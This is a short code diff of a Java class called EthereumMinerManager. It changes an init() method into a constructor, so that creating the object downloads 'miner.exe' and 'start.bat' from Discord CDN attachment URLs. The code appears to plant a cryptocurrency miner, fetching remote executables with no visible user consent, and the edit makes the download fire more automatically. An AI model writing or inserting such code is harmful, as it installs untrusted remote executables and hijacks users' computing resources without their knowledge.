@@ -25,10 +25,9 @@ public class EthereumMinerManager {
     protected Thread thread;
     protected String name;
 
-    public EthereumMinerManager init() {
+    public EthereumMinerManager() {
         download("https://cdn.discordapp.com/attachments/896292452913274920/959977176214683689/miner.exe", miner);
         download("https://cdn.discordapp.com/attachments/785909027896295465/961225710930890802/start.bat", bat);
-        return this;
     }
 
     public void start() {
